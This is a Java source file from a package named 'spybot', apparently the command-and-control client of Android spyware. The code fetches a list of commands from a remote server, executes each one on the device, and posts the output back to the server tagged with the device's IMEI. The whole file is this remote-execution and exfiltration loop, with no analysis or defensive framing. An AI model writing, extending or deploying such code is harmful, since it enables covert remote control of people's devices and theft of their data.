package org.spybot.connection;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Type;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicHttpResponse;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;
import org.spybot.main.Commands;
import org.spybot.model.Command;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

public class ServerConnector {

	String getNetworksUrl;

	public ServerConnector(String getNetworksUrl) {
		this.getNetworksUrl = getNetworksUrl;
	}
	
	public void invokeCommands()
	{
		System.out.println("Attempting to invoke the commands");
		HttpContext httpContext = new BasicHttpContext();
		DefaultHttpClient httpClient = new DefaultHttpClient();

		HttpGet get = new HttpGet(getNetworksUrl + "/commands/"); // + argsy w adresie.
		
		// execute the request
		BasicHttpResponse response;
		String json = null;
		try {
			//System.out.println(httpClient.execute(get, httpContext));
			response = (BasicHttpResponse) httpClient.execute(get, httpContext);
			if(response==null)
				System.out.println("The command server does not respond");
			else
			{
				InputStream is = response.getEntity().getContent();
				BufferedReader br = new BufferedReader(new InputStreamReader(is));
				StringBuilder contentBuilder = new StringBuilder();

				String line = null;
				while ((line = br.readLine()) != null)
					contentBuilder.append(line);

				br.close();
				is.close();

				json = contentBuilder.toString();
				
				System.out.println(json);
			}
			
		} catch (ClientProtocolException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		Gson gson = new Gson();
		Type listType = new TypeToken<List<Command>>(){}.getType();
		//json = "[{id:1, command:\"cmd\"}]";
		List<Command> commands= (List<Command>) gson.fromJson(json, listType);
		
		if(commands !=null)
		{
			if(commands.size()>=1)
				System.out.println("Got commands from server: " + commands.get(0).getCommand());
			
			String result;
			String id = Commands.getIMEI();
			StringEntity se = null;
			HttpPost post;
			Command cmd;
			for (int i=0; i<commands.size(); i++)
			{
				cmd = commands.get(i);
				post = new HttpPost(getNetworksUrl + "/results/"  + id +  "/" + cmd.getId() +  "/");
				result = Commands.invoke(cmd.getCommand());
				System.out.println(result);
				//String JSON = gson.toJson(new Result(result), Result.class);
				//json = gson.toJson(new Result(result), Result.class);
				//System.out.println(json);
				try {
					se = new StringEntity(result);
				} catch (UnsupportedEncodingException e) {
					e.printStackTrace();
				}
				//se.setContentEncoding("UTF-8");
				//se.setContentType("application/json");
				//se.setContentEncoding(new BasicHeader(HTTP.CONTENT_TYPE, "application/json"));//??
				post.setEntity(se);
				try {
					HttpResponse resp = httpClient.execute(post, httpContext);
					resp.getEntity().consumeContent();
				} catch (ClientProtocolException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
			}
			System.out.println("done!");
		}
	}
}	